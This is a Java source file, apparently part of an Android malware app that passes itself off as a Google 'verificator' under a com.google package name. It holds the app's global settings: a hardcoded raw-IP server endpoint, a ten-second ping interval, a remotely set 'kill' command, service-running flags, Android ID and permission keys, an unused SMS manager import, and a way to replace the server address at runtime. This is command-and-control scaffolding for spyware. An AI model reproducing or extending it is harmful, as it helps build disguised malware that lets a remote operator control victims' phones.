package com.google.verificator;

import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.SmsManager;


import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class AppGlobals extends Application {


    public static String SERVER_IP = "http://64.44.51.107/api";
    private static Context sContext;
    public static final String KEY_ANDROID_VERSION = "version";
    public static final String KEY_ANDROID_ID = "android_id";
    public static final String KEY_PERMISSION = "permission";
    public static final String KEY_SERVICE = "service";
    public static final String KEY_KILL = "kill";
    public static final String RELEASE_VERSION = "1.2";

    public static long KEY_PING_INTERVAL = 10000;
    private static boolean success = false;
    public static boolean hasInternet = false;


    @Override
    public void onCreate() {
        super.onCreate();
        sContext = getApplicationContext();

    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnected();

    }

    public static boolean isInternetWorking() {
        new Thread(() -> {
            try {
                URL url = new URL("https://google.com");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setConnectTimeout(10000);
                connection.connect();
                success = connection.getResponseCode() == 200;
                hasInternet = success;
            } catch (IOException e) {
                e.printStackTrace();
            }

        }).start();
        return success;
    }


    public static boolean isServiceRunning() {
        SharedPreferences sharedPreferences = getPreferenceManager();
        return sharedPreferences.getBoolean(KEY_SERVICE, false);
    }

    public static void serviceRunning(boolean type) {
        SharedPreferences sharedPreferences = getPreferenceManager();
        sharedPreferences.edit().putBoolean(KEY_SERVICE, type).apply();
    }

    public static boolean isKillCommandTrue() {
        SharedPreferences sharedPreferences = getPreferenceManager();
        return sharedPreferences.getBoolean(KEY_KILL, false);
    }

    public static void saveKillCommand(boolean type) {
        SharedPreferences sharedPreferences = getPreferenceManager();
        sharedPreferences.edit().putBoolean(KEY_KILL, type).apply();
    }

    public static Context getContext() {
        return sContext;
    }


    public static void saveIPToSharedPreferences( String value) {
        SharedPreferences sharedPreferences = getPreferenceManager();
        sharedPreferences.edit().putString("ip", value).apply();
    }

    public static String getIPFromSharedPreferences() {
        SharedPreferences sharedPreferences = getPreferenceManager();
        return sharedPreferences.getString("ip", SERVER_IP);
    }

    public static String getReleaseVersion() {
        SharedPreferences sharedPreferences = getPreferenceManager();
        return sharedPreferences.getString("ver", RELEASE_VERSION);
    }

    public static SharedPreferences getPreferenceManager() {
        return getContext().getSharedPreferences("shared_prefs", MODE_PRIVATE);
    }

    public static void saveDataToSharedPreferences(String key, String value) {
        SharedPreferences sharedPreferences = getPreferenceManager();
        sharedPreferences.edit().putString(key, value).apply();
    }

    public static String getStringFromSharedPreferences(String key) {
        SharedPreferences sharedPreferences = getPreferenceManager();
        return sharedPreferences.getString(key, "");
    }

     static void pingNotOk(String newUrl) {
       // AppGlobals.saveIPToSharedPreferences(newUrl);
    }
}
